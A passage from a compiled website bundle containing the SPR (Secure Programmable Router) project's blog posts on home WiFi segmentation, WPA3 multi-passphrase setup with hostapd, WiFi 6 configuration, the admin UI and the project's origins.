endpoint & browse to http://192.168.2.1 to access the admin interface.\\n\\nLogin using the credentials shown in the output from the script or if you set the password manually (*NOTE* you can check the login info by running `SKIP_VPN=1 ./virtual_install.sh`).\\n\\nIf you prefer to use curl:\\n```sh\\n$ export TOKEN=\\"BASE64-TOKEN-FROM-OUTPUT\\"\\n$ curl -s -H \\"Authorization: Bearer $TOKEN\\" 192.168.2.1/devices\\n```\\n\\nCheckout the [documentation](https://www.supernetworks.org/pages/api/0#section/Introduction) to get started using the SPR API.\\n\\n## Modify Blocklists\\n\\nIn the admin interface you can enable more blocklists by clicking *Blocklists/Ad-block* under DNS:\\n![](/img/screenshot_dns_blocklist.png)\\n\\nSPR comes bundled with the hosts file from https://github.com/StevenBlack/hosts and the blocklists from the https://github.com/blocklistproject/Lists repository, including:\\n*redirect, ads, facebook, twitter, malware, porn, redirect, tracking, youtube, everything*\\n\\nIf something is missing you can always add custom blocklists or block specific domains.\\n\\n## View traffic\\n\\nNavigate to *DNS Log* in the DNS category, select the client to get a log of domains:\\n![](/img/screenshot_dns_log.png)\\n\\nHere you can also add more blocks, domain overrides if you want to allow something temporarily, delete logs or disable them completely under *Settings*.\\n\\nIt is also possible to get more detail traffic for connections under *Traffic*:\\n![](/img/screenshot_traffic.png)\\n\\n## Outro and random notes\\n\\nYou can remove lan from your device groups for a device but its needed to access the admin interface.\\n\\nSPR is configured to use DNS over HTTPs when resolving domains. You can modify the Coredns configuration under configs/dns/Corefile"},{"id":"secure router chaining","metadata":{"permalink":"/pages/blog/secure router chaining","source":"@site/blog/2022-09-03-secure-router-chaining.md","title":"Securely Chaining Routers","description":"Building a Home WiFi Network","date":"2022-09-03T00:00:00.000Z","formattedDate":"September 3, 2022","tags":[{"label":"SPR","permalink":"/pages/blog/tags/spr"},{"label":"Routers","permalink":"/pages/blog/tags/routers"},{"label":"Networking 101","permalink":"/pages/blog/tags/networking-101"}],"readingTime":3.715,"hasTruncateMarker":false,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad"}],"frontMatter":{"slug":"secure router chaining","title":"Securely Chaining Routers","authors":"ltsrad","tags":["SPR","Routers","Networking 101"]},"unlisted":false,"prevItem":{"title":"SPR in the cloud","permalink":"/pages/blog/virtual SPR"},"nextItem":{"title":"SPR Supports WPA3 with Multiple Passwords","permalink":"/pages/blog/multipsk and wpa3"}},"content":"## Building a Home WiFi Network\\n\\nPutting together a home network has several subtly annoying security tradeoffs.\\n\\n*Users want*\\n- **Ease of Use & Connectivity**\\n\\n  Maximized by keeping devices maximally connected with a simple passphrase\\n\\n- **Privacy and Security**\\n\\n  Maximized by keeping devices minimally connected. And ideally offline  \ud83e\udda6\\n\\nIf the goal is a bit of both, how to do segmentation correctly quickly becomes\\na bit of a puzzle\\n\\n\\n## What\'s the Best Way to Chain Your Routers?\\n\\nThe \\"Secure Router\\" can be considered the Work From Home access point,\\nand the \\"Guest Router\\" can be considered the Guest, Personal, or IOT access point.\\n\\n ![](/img/chaining_choices.png)\\n\\n#### The Worst Choice\\n\\nOption #3 is to connect the internet to the secure router, and then plug the\\nguest router into the secure router. Guests and untrustworthy devices can connect\\nto the guest router.\\n\\nThis might make sense intuitively for some. You put the Secure Router close\\nto the internet since that\'s where all the internet traffic will go out from, and\\nif the Guest Router is compromised, it can\'t intercept traffic.\\n\\nHowever, since the Guest Router is a Peer on the Secure Router network\'s LAN,\\nevery \\"Guest\\" station and the router will be able to reach the secure router and\\ndevices on the secure network LAN.\\n\\nUnless either the Guest Router can block requests to the Secure LAN with its firewall,\\nor the Secure Router can isolate the port for the Guest Router for only internet access,\\nthis is not an accepted best practice.\\n\\n#### Split ESSIDs\\n\\nOption #1 is to share a router for both SSIDs, with one ESSID and password for the\\nSecure LAN and one for the Guest LAN.\\n\\nThe expectation is that devices can not send packets across the two LANs.\\n\\nThe great tradeoff with this is that if a user wants to control their IOT devices\\nthey have to switch to the guest network. And if device isolation is enabled on the guest network,\\ndevices won\'t be able to communicate at all. So as security improves, usability decreases.\\n\\nThe guest isolation may also be insufficient. The shared passphrase implies MITM capabilities,\\nand passive traffic decryption capabilities with WPA2 or active decryption capabilities with WPA3.\\n\\nSome routers place both ESSIDs on the SAME LAN. Usually this allows the secure devices\\nto reach the guest devices. Usability has been increased, but this often leads to subtle flaws\\nthat allow the guest devices to bypass their isolation entirely.\\n\\nAnother upside to this approach is that bandwidth can be shared for the ESSIDs,\\nreducing wasted WiFi spectrum.\\n\\nOverall, this is an accepted best practice, but it comes down to the details where very quickly\\nusers are trading off security for usability.\\n\\n#### The Best of the Three: Guest Router First, Secure Router Second\\n\\nOption #2 is the recommended and accepted best practice. The Guest router connects\\ndirectly to the internet, and the Secure router plugs into the Guest Router.\\n\\nThis approach yields a favorable combination of security and usability. Devices on the\\nsecure LAN can access devices on the Guest LAN, which is great for controlling IOT devices.\\nAnd devices on the Guest LAN have no way to initiate communication to devices on the\\nSecure LAN, blocked by the Secure Router firewall.\\n\\nThe main downsides: The guest router could have ISP credentials, and could MITM\\ninternet traffic if compromised by an untrusted device.\\n\\n### Multi PSK & VLANs\\n\\nToday\'s most featureful home routers offer support for one passphrase per device. This solves\\nmany of the MITM and decryption issues for guest isolation. The devices can be placed into VLANs with unique WiFi passphrases, GTKs, and secure firewall rules creating truly strong isolation. These mechanisms provide powerful mechanisms for designing a home network securely.\\n\\nThis is the approach SPR follows, and we\'ve [spearheaded Multi-PSK with WPA3](/blog/multipsk%20and%20wpa3).\\nSPR provides maximum isolation capabilities by placing each station into its own LAN. Users can then easily\\ncreate groups of interconnected devices.\\n\\n![](/img/tinynets.png)\\n\\n\\n### SPR Supports Plugging into An Existing Router Securely\\n\\nWe recommend running SPR by plugging it into an existing router. To support securely doing this,\\nby default -- the firewall will block access to private network addresses over the upstream interface.\\n\\nThis prevents devices connected to SPR from accessing devices on the LAN of the current router.\\n\\nTo allow a device access to private network addresses upstream, users can apply the `lan_upstream` tag to the device.\\n\\n![](/img/add_wifi_device_lan_upstream.png)\\n\\nAnd then manage the tag in the Devices view\\n\\n![](/img/manage_lan_upstream_tag.png)"},{"id":"multipsk and wpa3","metadata":{"permalink":"/pages/blog/multipsk and wpa3","source":"@site/blog/2022-05-02-wpa3-multipsk.md","title":"SPR Supports WPA3 with Multiple Passwords","description":"SPR\'s WPA3 Multiple Passwords per SSID Surprises People","date":"2022-05-02T00:00:00.000Z","formattedDate":"May 2, 2022","tags":[{"label":"SPR","permalink":"/pages/blog/tags/spr"},{"label":"wifi6","permalink":"/pages/blog/tags/wifi-6"},{"label":"WPA3","permalink":"/pages/blog/tags/wpa-3"},{"label":"PPSK","permalink":"/pages/blog/tags/ppsk"}],"readingTime":1.885,"hasTruncateMarker":false,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad"}],"frontMatter":{"slug":"multipsk and wpa3","title":"SPR Supports WPA3 with Multiple Passwords","authors":"ltsrad","tags":["SPR","wifi6","WPA3","PPSK"]},"unlisted":false,"prevItem":{"title":"Securely Chaining Routers","permalink":"/pages/blog/secure router chaining"},"nextItem":{"title":"Gigabit WiFi with SPR & The 4x4 MT7915","permalink":"/pages/blog/wifi6"}},"content":"### SPR\'s WPA3 Multiple Passwords per SSID Surprises People\\n\\n WiFi nerds and people working on WiFi products have shared their surprise with me a few times now about the integration for multi-PSK with WPA3. This is something already mostly built into HostAP so it should be possible anywhere, although it is not obvious from the documentation. I\'m told that most other projects simply don\'t do it, putting SPR at the head of the pack! In this post I\'ll share how it\'s integrated, so that others can benefit from the ideas and improve WiFi security for people all around the world.\\n\\n### WPA3 Authentication is Fundamentally Different\\n\\nWPA3 authentication uses [Dragonfly](https://datatracker.ietf.org/doc/html/rfc7664), a Zero-Knowledge Proof in its Simulataneous Authentication of Equals Handshake protocol. With SAE there is nothing to sniff and crack offline from the key exchange. This is in contrast to WPA/WPA2 which is notorious for password cracking of weak passwords from captured handshakes -- or even more conteniently, by using the [RSN IE specification flaw](https://hashcat.net/forum/thread-7717.html).\\n\\nFor Multi-PSK, a router can go down the list of stored PSKs and try each key and see if it had a matching one.\\nFor WPA3, this is not possible. Authenticating a password requires an interactive zero knowledge proof, so a new handshake is required to try a different password.\\n\\n### SPR Uses HostAP\'s MAC Assignment\\n\\nPSKs are assigned by MAC address. HostAP finds the passphrase to use by MAC address to perform the authentication, using the correct PSK the first time around for the interactive proof.\\n\\nThe syntax for hostapd.conf to assign multiple devices is as follows:\\n```\\nsae_password=1stPassphraseHere|mac=01:23:45:67:89:aa\\nsae_password=2ndPassphraseHere|mac=01:23:45:67:89:ab\\n```\\n\\n### Adding Device is Seamless\\n\\nAdding devices is an easy process. If a user does know a MAC address, they can certainly\\nspecify the MAC address ahead of time. However, SPR can use a wildcard MAC to match a new\\nincoming device. When the device authenticates, that PSK will be assigned to the device.\\n\\n```\\nsae_password=3rdPassphraseHere|mac=ff:ff:ff:ff:ff:ff\\n```\\n\\n### Devices Workflow\\n\\n#### First, go to the add device modal and add a device name and hit next\\n\\n![](/img/add_device_1.png)\\n\\n#### Next, scan the QR code  or type the passphrase on a new device\\n\\n![](/img/add_device_2.png)\\n\\n#### Upon connection the UI will notify success and the PSK will be assigned to the MAC\\n\\n![](/img/add_device_3.png)"},{"id":"wifi6","metadata":{"permalink":"/pages/blog/wifi6","source":"@site/blog/2022-04-13-gigabit-wifi-mt7915.md","title":"Gigabit WiFi with SPR & The 4x4 MT7915","description":"Intro","date":"2022-04-13T00:00:00.000Z","formattedDate":"April 13, 2022","tags":[{"label":"SPR","permalink":"/pages/blog/tags/spr"},{"label":"wifi6","permalink":"/pages/blog/tags/wifi-6"},{"label":"80211ax","permalink":"/pages/blog/tags/80211-ax"}],"readingTime":2.29,"hasTruncateMarker":false,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad"}],"frontMatter":{"slug":"wifi6","title":"Gigabit WiFi with SPR & The 4x4 MT7915","authors":"ltsrad","tags":["SPR","wifi6","80211ax"]},"unlisted":false,"prevItem":{"title":"SPR Supports WPA3 with Multiple Passwords","permalink":"/pages/blog/multipsk and wpa3"},"nextItem":{"title":"Running SPR on a Mini PC with WiFi 6","permalink":"/pages/blog/spr_mini_pc"}},"content":"## Intro\\nIn this post we\'ll cover how to configure hostapd with the mt7915 to run 160 MHz channels over 5ghz.\\nThis allows stations to break gigabit speeds for WiFi with only 2 spatial streams.\\n\\n## Requirements\\n\\n- A 160Mhz capable card on the SPR device, for example [AsiaRF\'s AW7915-NP1](https://www.asiarf.com/shop/wifi-wlan/wifi_mini_pcie/wifi6-4t4r-dual-bands-selectable-mpcie-card-ieee802-11ax-ac-a-b-g-n-2-4g-5ghz-aw7915-np1/)\\n- 160MHz capable client wifi card, such as [Intel\'s AX210](https://www.intel.com/content/www/us/en/products/sku/204836/intel-wifi-6e-ax210-gig/specifications.html). [Intel\'s AX201 and AX200](https://ark.intel.com/content/www/us/en/ark/products/130293/intel-wifi-6-ax201-gig.html) also have 160Mhz support for 5ghz.\\n\\n## Preparation\\n\\n- Set up your AP device according to the [SPR Setup Guide](/docs/setup_guides/setup_run_spr)\\n- For mt7915, run a mainline kernel or a kernel with fixes from `https://github.com/openwrt/mt76` and the latest firmware. I\'ll publish some updates to building SPR with these in the near future. Fixes are needed for DFS support.\\n\\n## Hostapd configuration\\n\\n1. Modify `config/wifi/hostpad.conf`\\n2. Make sure vht_capab includes [VHT160] and [SHORT-GI-160]\\n3. Make sure to set vht_oper_chwidth/he_oper_chwidth set to 2.\\n4. For the channel configuration, the following are valid 160mhz centers on 5ghz: [50, 114, 163]. Set the vht/he_oper_centr_freq_seg0_idx to these values and the channel to the center value - 14.\\n5. Set ieee80211ax to 1\\n\\n```\\nctrl_interface=/state/wifi/control\\ncountry_code=US\\ninterface=wlan0\\nssid=TestLab\\nhw_mode=a\\nieee80211d=1\\nieee80211h=1\\nieee80211n=1\\nieee80211ac=1\\nieee80211ax=1\\nhe_su_beamformer=1\\nhe_su_beamformee=1\\nhe_mu_beamformer=1\\nwmm_enabled=1\\npreamble=1\\nht_capab=[LDPC][HT40+][HT40-][GF][SHORT-GI-20][SHORT-GI-40]\\nvht_capab=[MAX-MPDU-7991][SU-BEAMFORMEE][SU-BEAMFORMER][VHT160][RXLDPC][SHORT-GI-160][SHORT-GI-80][MAX-A-MPDU-LEN-EXP3][RX-ANTENNA-PATTERN][TX-ANTENNA-PATTERN][TX-STBC-2BY1][RX-STBC-1][MU-BEAMFORMER[[MU-BEAMFORMEE]\\nvht_oper_chwidth=2\\nhe_oper_chwidth=2\\nchannel=36\\nvht_oper_centr_freq_seg0_idx=50\\nhe_oper_centr_freq_seg0_idx=50\\nauth_algs=1\\nwpa=2\\nwpa_key_mgmt=WPA-PSK WPA-PSK-SHA256 SAE\\nrsn_pairwise=CCMP\\n\\n# Security parameters\\n\\n# Isolate stations and per-station group keys\\nap_isolate=1\\nmulticast_to_unicast=1\\n\\n# Mitigate krack attack\\nwpa_disable_eapol_key_retries=1\\n\\n# VLAN\\nper_sta_vif=1\\n\\n# Passwords\\n\\nsae_psk_file=/configs/wifi/sae_passwords\\nwpa_psk_file=/configs/wifi/wpa2pskfile\\n```\\n\\n2. Restart hostapd\\n\\n```\\nroot@pirouter:~/super# docker compose restart wifid\\n```\\n\\nIf anything has gone wrong, check the docker compose logs for the wifid service.\\n\\n\\n## Perf Test\\n\\nRunning iperf3 on the SPR device, and iperf3 on a client with AX210 chip, we see the following:\\n\\n#### On SPR:\\n`iw wls6 info`\\n\\n```\\nInterface wls6\\n        ifindex 5\\n        wdev 0x1\\n        addr 00:0a:52:07:32:c9\\n        ssid testlab\\n        type AP\\n        wiphy 0\\n        channel 100 (5500 MHz), width: 160 MHz, center1: 5570 MHz\\n        txpower 23.00 dBm\\n        multicast TXQ:\\n                qsz-byt qsz-pkt flows   drops   marks   overlmt hashcol tx-bytes        tx-packets\\n                0       0       246     0       0       0       0       27114           272\\n```\\n\\n`iperf3 -s`\\n\\n#### On the station:\\n\\n`iperf3 -c 192.168.2.1`\\n\\n\\n#### Performance results\\n\\n```\\nAccepted connection from 192.168.2.26, port 56156\\n[  5] local 192.168.2.1 port 5201 connected to 192.168.2.26 port 56158\\n[ ID] Interval           Transfer     Bitrate                                                         \\n[  5]   0.00-1.00   sec   139 MBytes  1.17 Gbits/sec                   \\n[  5]   1.00-2.00   sec   126 MBytes  1.06 Gbits/sec                  \\n[  5]   2.00-3.00   sec   141 MBytes  1.18 Gbits/sec                  \\n[  5]   3.00-4.00   sec   137 MBytes  1.15 Gbits/sec                  \\n[  5]   4.00-5.00   sec   152 MBytes  1.27 Gbits/sec                  \\n[  5]   5.00-6.00   sec   153 MBytes  1.28 Gbits/sec                  \\n[  5]   6.00-7.00   sec   155 MBytes  1.30 Gbits/sec                  \\n[  5]   7.00-8.00   sec   148 MBytes  1.24 Gbits/sec                  \\n[  5]   8.00-9.00   sec   145 MBytes  1.21 Gbits/sec                  \\n[  5]   9.00-10.00  sec   119 MBytes   995 Mbits/sec                                                  \\n[  5]  10.00-10.00  sec   482 KBytes  1.22 Gbits/sec                                                  \\n```"},{"id":"spr_mini_pc","metadata":{"permalink":"/pages/blog/spr_mini_pc","source":"@site/blog/2022-03-18-x64-support.md","title":"Running SPR on a Mini PC with WiFi 6","description":"Intro","date":"2022-03-18T00:00:00.000Z","formattedDate":"March 18, 2022","tags":[{"label":"SPR","permalink":"/pages/blog/tags/spr"},{"label":"x64","permalink":"/pages/blog/tags/x-64"},{"label":"80211ax","permalink":"/pages/blog/tags/80211-ax"}],"readingTime":2.585,"hasTruncateMarker":false,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad"}],"frontMatter":{"slug":"spr_mini_pc","title":"Running SPR on a Mini PC with WiFi 6","authors":"ltsrad","tags":["SPR","x64","80211ax"]},"unlisted":false,"prevItem":{"title":"Gigabit WiFi with SPR & The 4x4 MT7915","permalink":"/pages/blog/wifi6"},"nextItem":{"title":"Supernetworks just Released a React User Interface","permalink":"/pages/blog/UI Push"}},"content":"## Intro\\n\\nIn the blog post we\'ll describe how to build and run SPR on a Mini-PC. And we\'ll use a WiFi 6 capable radio inside.\\n\\n## First, get a Mini PC ready\\n\\n1. Identify a good mini PC to use. [Wilson](https://twitter.com/willy_wong) suggested\\na look at QOTOM\'s i3 broadwell routers.\\n\\n  The [g330](https://amzn.to/36qmZjI) is not bad. It\'s a fanless build with a TDP of 15W. One mini pci-e slot is dedicated to [mSATA](https://en.wikipedia.org/wiki/Serial_ATA#Mini-SATA_(mSATA)), and the other can be used to fit a wifi radio. It also has additional SATA available for one more storage drive.\\n\\n  <a href=\\"https://amzn.to/36qmZjI\\">\\n\\n  ![](https://m.media-amazon.com/images/I/61KcP6zQLsL._AC_SX679_.jpg)\\n\\n  </a>\\n\\n  WARNING: On this device, the mini-pcie slot has a tall post for half-sized cards that needs to be removed to fit thicker full sized WiFi cards.\\n\\n  2. Get a good WiFi radio.\\n\\n  We\'ll run with an 802.11ax card that works with Linux in AP mode (at least 802.11ac is recommended).\\n\\n  Mediatek is the disruptor in this space and supports AP mode on Linux. \\\\[NOTE: Many other cards will NOT work with ax in AP mode on Linux with open source drivers\\\\] . If you have recommendations please do not hesitate to reach out on the [matrix chat](https://matrix.to/#/#spr:matrix.org).  For the G330 Qotom, 2 antennas wires are provided to outside the case, so the 2x2 configuration is best.\\n\\n  The [MT7915](https://www.asiarf.com/shop/wifi-wlan/wifi_mini_pcie/wifi6-2t2r-dual-bands-dbdc-mpcie-card-11ax-mt7915-aw7915-npd/) can be purchased from AsiaRF.\\n\\n  <a href=\\"https://www.asiarf.com/shop/wifi-wlan/wifi_mini_pcie/wifi6-2t2r-dual-bands-dbdc-mpcie-card-11ax-mt7915-aw7915-npd/\\" >\\n\\n  ![](https://sp-ao.shortpixel.ai/client/to_webp,q_glossy,ret_img,w_400,h_400/https://www.asiarf.com/wp-content/uploads/2021/07/aw7915-npd-1_top.jpg)\\n\\n  </a>\\n\\n\\n\\n## Setup\\n\\nDownload and install Ubuntu Server. Since the WiFi 6 driver is a work in progress, we grabbed a daily release of [Jammy Jellyfish 22.04](https://cdimage.ubuntu.com/ubuntu-server/daily-live/current/jammy-live-server-amd64.iso) from the [Ubuntu Live](https://cdimage.ubuntu.com/ubuntu-server/daily-live/current/) page to get the latest fixes. Copy the installer to installation media (a flash drive) then plug it in and go.\\n\\nThen follow the [SPR Setup Guide](/docs/setup_guides/setup_run_spr).\\n\\nOur config/base/config.sh:\\n```\\n#!/bin/sh                                                                                                              \\nSSID_NAME=6lab                                                                                                         \\nSSID_INTERFACE=wlan1                                                                                                   \\n\\n#PPPIF=eth0                                                                                                            \\n#WANIF=ppp0\\n#PPP_VLANID=201\\n#PPP_PROVIDER=provider-config\\nWANIF=enp1s0\\nRUN_WAN_DHCP=true\\nRUN_WAN_DHCP_IPV=4\\n# Uncomment the next line if a second ethernet port goes to wired LAN\\n#LANIF=eth1\\nVLANIF=wlan1\\nVLANSIF=$VLANIF.\\n\\nLANIP=192.168.3.1\\nDNSIP=$LANIP\\nTINYNETSTART=192.168.3.4\\nTINYNETSTOP=192.168.3.255\\nTINYNETMASK=255.255.255.252\\nTINYSLASHMASK=30\\nDOCKERNET=172.17.0.0/16\\nDOCKERIF=docker0\\n\\nWIREGUARD_PORT=51280\\n#WIREGUARD_NETWORK=192.168.3.1/24\\n```\\n\\n## Configure hostapd for 802.11AX\\n\\nOn the SPR device, modify `configs/wifi/hostapd.conf` and add:\\n\\n```\\nieee80211ax=1\\nhe_su_beamformer=1\\nhe_su_beamformee=1\\nhe_mu_beamformer=1\\nhe_oper_chwidth=1 # 80mhz channel\\nhe_oper_centr_freq_seg0_idx=42\\n```\\n\\nRestart wifid\\n```\\ndocker compose restart wifid\\n```\\n\\n\\nConnect a wifi 6 client and verify HE codings are available\\n\\n```\\n# iw dev wlan1.4096 station dump -v  | grep bitrate\\n        tx bitrate:     1200.9 MBit/s 80MHz HE-MCS 11 HE-NSS 2 HE-GI 0 HE-DCM 0\\n        rx bitrate:     720.6 MBit/s 80MHz HE-MCS 7 HE-NSS 2 HE-GI 0 HE-DCM 0\\n```\\n\\n## Some Notes on the MT7915\\n\\nThe MT7915 is a Dual Mode driver. This means that it supports both 2Ghz and 5Ghz\\nfrequencies simultaneously. For our install the 2ghz interface is on `wlan0` and 5Ghz on `wlan1`. This is really wonderful, since one card can serve older IOT devices that only run on 2Ghz as well as more modern devices at high speeds.\\n\\nThe linux kernel driver is not yet as stable as it could be, so beware that it may not yet be production ready -- several assertions and crashes were noticed. The mainline kernel does not yet support radar scanning, however the code is available in the [openwrt development branch](https://github.com/openwrt/mt76)."},{"id":"UI Push","metadata":{"permalink":"/pages/blog/UI Push","source":"@site/blog/2022-01-19-min-ui.md","title":"Supernetworks just Released a React User Interface","description":"User Friendliness","date":"2022-01-19T00:00:00.000Z","formattedDate":"January 19, 2022","tags":[{"label":"SPR","permalink":"/pages/blog/tags/spr"},{"label":"UI","permalink":"/pages/blog/tags/ui"},{"label":"React","permalink":"/pages/blog/tags/react"},{"label":"Golang","permalink":"/pages/blog/tags/golang"}],"readingTime":2.335,"hasTruncateMarker":false,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad"}],"frontMatter":{"slug":"UI Push","title":"Supernetworks just Released a React User Interface","authors":"ltsrad","tags":["SPR","UI","React","Golang"]},"unlisted":false,"prevItem":{"title":"Running SPR on a Mini PC with WiFi 6","permalink":"/pages/blog/spr_mini_pc"},"nextItem":{"title":"Announcing The SPR Project","permalink":"/pages/blog/first-blog-post"}},"content":"## User Friendliness\\n\\nThe SPR project started out as a series of bash scripts and configuration files. Adding new devices\\nwas a little bit error prone, as everything was done on the command line. Each device would\\nrequire a new, strong password, and each device needed to be added to a zone\'s configuration.\\nNext, hostapd had to be restarted to get WPA3 password reloading to work. It was hard to debug and not apparent if things failed.\\n\\nWhat would make SPR super useful, though, would be if it was easy to use. And a user interface can do that for us.\\n\\nSo this week, Supernetworks pushed out a [frontend](https://github.com/spr-networks/super/tree/main/frontend) for testing.\\n\\n## This Release Delivers Basic UI Features\\n\\nThree functions are now available:\\n  - Add a new wireless device to the network\\n  - List devices\\n  - Set device access zones\\n\\nWhile these are simple things, and seemingly easy, SPR\'s services work together to build a network\\nthat is virtually unlike all other wifi setups available today. As a result, the base station service,\\nthe DHCP server, and the API need to work together to leverage their features so that users have\\na super smooth  experience.\\n\\n## See a Demo\\n\\n<div>\\n  <video width=\\"100%\\" height=\\"100%\\" playsInline muted controls src=\\"/pages/video/sprui.mp4\\" type=\\"video/mp4\\">\\n  </video>\\n</div>\\n\\n### How Devices are Connected to SPR\\n  * Each wireless device is on an isolated network, keyed in by their MAC address and passphrase\\n  * MAC/ARP spoofing is blocked by hardened firewall rules to completely stop ethernet/IP-based evasion for lateral movement\\n  * Zones specify the level of each individual device\'s access\\n  * Custom zones can create groups of devices that can intercommunicate without having full LAN access\\n  * Built in ad blocking with CoreDNS\\n\\n#### Some of the challenges were\\n  *  Laying down a solid foundation between the API and frontend to make adding new features great\\n  *  Supporting a smooth WPA3 experience, which uses a ZKP for authentication\\n  *  Making it fast and easy to add a device without having to also know or enter its MAC address ahead of time\\n\\n\\n## The Zones\\n\\nThe built in zones are\\n  - DNS for outbound DNS queries\\n  - WAN for outbound internet access\\n  - LAN for general access to all local devices\\n\\nWhen a user types in a new name, such as \\"Cameras\\",  NFTables verdict maps gets created\\nby the API. All of the members of the maps can send and receive IP traffic to one another,\\nbut do not get general access to the LAN.  In the future, custom firewall rules will be added\\nto further specify how the groups interact.\\n\\n## What\'s Next for the UI\\n\\nFor the road map, I\'m thinking about security features such as intrusion detection\\nor automated security scanning and fingerprinting, network debugging and bandwidth monitoring,\\nper-device ad blocking, and home automation."},{"id":"first-blog-post","metadata":{"permalink":"/pages/blog/first-blog-post","source":"@site/blog/2022-01-10-first-blog-post.md","title":"Announcing The SPR Project","description":"Hello, SPR","date":"2022-01-10T00:00:00.000Z","formattedDate":"January 10, 2022","tags":[{"label":"SPR","permalink":"/pages/blog/tags/spr"},{"label":"Hello World","permalink":"/pages/blog/tags/hello-world"}],"readingTime":5.125,"hasTruncateMarker":false,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad"}],"frontMatter":{"slug":"first-blog-post","title":"Announcing The SPR Project","authors":"ltsrad","tags":["SPR","Hello World"]},"unlisted":false,"prevItem":{"title":"Supernetworks just Released a React User Interface","permalink":"/pages/blog/UI Push"}},"content":"## Hello, SPR\\n\\nI\'m happy to start releasing the **Secure Programmable Router** project to the world. I\'ve been running my home WiFi\\nwith it for the past few months and I\'m beyond excited to give back to the open source community.\\nI started working on this project because I think that Linux provides a tremendous amount of agility and\\npower for secure home networking but I felt like there was no router project out there that pulled it all together.\\n\\n## The SPR project is about several things\\n\\n- A highly secure foundation to operate a home network where using the internet is safe and it\'s easy to see and control what IoT devices are up to when they are plugged in.\\n\\n- Making home privacy easy instead of begrudgingly sharing telemetry with big data companies.\\n\\n- Open source and empowering developers by lowering the barrier to entry for coding with home networking.\\n\\n- About reducing the barrier for entry.\\n\\n- Enabling scripting and rapid prototyping.\\n\\n- Adapting modern networking paradigms and tools that can meets today\'s needs.\\n\\n## How SPR Came To Be\\n\\nDuring the past year, I took a serious look at [opnsense](https://opnsense.org/) and [OpenWRT](https://openwrt.org/), and ordered over a dozen different wifi routers to set up my home network. I sat down and built and deployed my own OpenWRT images and to set up secure wifi networks to connect with a more serious firewall. What I found was that the setups I had managed to achieve were not only frustrating to manage, but when I went to test their security, I found time and time again that vendor wifi routers were insecure due to fundamental limitations with the network designs. On top of that, they were [riddled with software security holes](https://www.zerodayinitiative.com/blog/2021/11/1/pwn2ownaustin). Unfortunately, running the open source builds of OpenWRT often had degraded performance versus the proprietary vendor patches or required breaking secure boot.\\n\\nI felt frustrated because I felt like I had lost control over my own home network. I had only a basic idea of what I was running and what my devices were doing, let alone the routers themselves. Between smart bulbs and vacuum cleaners and home security cameras and speakers, TVs, gaming consoles, laptops, desktops, streaming devices, more routers, and work equipment, there was a lot of stuff that was online.\\n\\nI\'ve been working in computer security for over 15 years and I often get asked for how to set up a home network.\\n\\nThe best advice I could give people for their home wifi was to keep their mission critical systems on a dedicated wifi router, and plug that one into the main wifi router with all the other\\n\\"stuffs\\" that ultimately connects to the internet. This is awkward and requires switching networks or IGMP proxying to do discovery or zeroconf. This doesn\'t scale well across a multi-office home with repeaters and backhaul. It also doesn\'t scale well in an apartment where there\'s competition for radio bandwidth with neighbors for essentially one of only three coveted 80mhz channels on 5ghz.\\n\\nThe next best advice was to split out the \\"whatever\\" non-critical devices to the guest network, and the mission critical stuff on the main network. Hardening the guest network with isolation breaks discovery and streaming as well. In practice I found that most of the routers I looked at did not have good guest isolation anyway when enabled, something I will blog about later. No exploits are required, because more or less an attacker can just ask a router to send packets for them to work around hostapd\'s AP Isolation feature, and most of the routers will happily do what they do best, route the packets.\\n\\nAt the end of the day though, it\'s fundamentally a flawed idea to have a shared passphrase across many devices because that passphrase effectively lets devices spoof each other or attempt to intercept traffic, making it tough to truly firewall devices.\\n\\nSo then I started looking into enterprise wifi authentication: 802.1x  (EAP-PEAP, EAP-TLS, EAP-PWD). EAP-TLS really is the only secure way to do things since EAP-PEAP suffers from fundamental [man in the middle issues](https://datatracker.ietf.org/doc/html/draft-josefsson-pppext-eap-tls-eap-10#section-5.8) that were [never fixed](https://github.com/latelee/hostapd/commit/a190189d221aaef869ae2f52f7ead75b0c327995). Or EAP-PWD (which is almost wpa3) would be great,  if it was supported by more devices and drivers, and well with EAP-TLS, certificate management is pain.\\n\\nI really wished that one could just use a unique passphrase per device. Well, it turns out that yes, that works, and hostapd supports it out of the box. With some logic and [usability and correctness fixes](https://github.com/spr-networks/hostap/commit/279c5203e4c767701ac9fb7cf31624390437d854) to hostapd, and it was easy to seamlessly add new devices and their passphrases on the fly.\\n\\nOkay that was great. Next, I created strong device isolation with per-device subnets that could be configured to communicate with other subnets using forwarding rules. The resulting network was a bit too different than the spirit of the networking scripts in OpenWRT, and the patching became unreasonable to expect for upstream to accept, so I started from fresh ground.\\n\\nSPR is implemented for rapid iteration. Services are containerized so that developers can swap out core services or roll up new ones in a testable, reproducible manner. An API drives configuration to allow for customization. SPR Runs off of Ubuntu, with Docker containers, and manages the network with NFTables. It uses hostapd for the base station software, CoreDHCP for DHCP, CoreDNS for DNS, and supports Wireguard.\\n\\nSPR simply enables users to do better than today\'s status quo. It lets users run a hardened, secure network without restrictive drawbacks. It lets users connect their consumer electronics to the internet with the peace of mind that doing so does not weaken their home network security.\\n\\n## What\'s Next\\n\\nToday SPR runs as a proof of concept on a Raspberry Pi.  With a USB dongle it\'s well able to handle over a dozen wifi stations and serve data from the internet with rates up to 500mbps. Work is underway to expand to new systems.\\n\\nI\'m currently wrapping up a Web UI to make SPR user friendly. In the near future I\'ll be posting a road map for what\'s planned.\\n\\nWant to learn more and discuss? Join the [Discord Chat](https://discord.gg/EUjTKJPPAX)"}]}')}}]);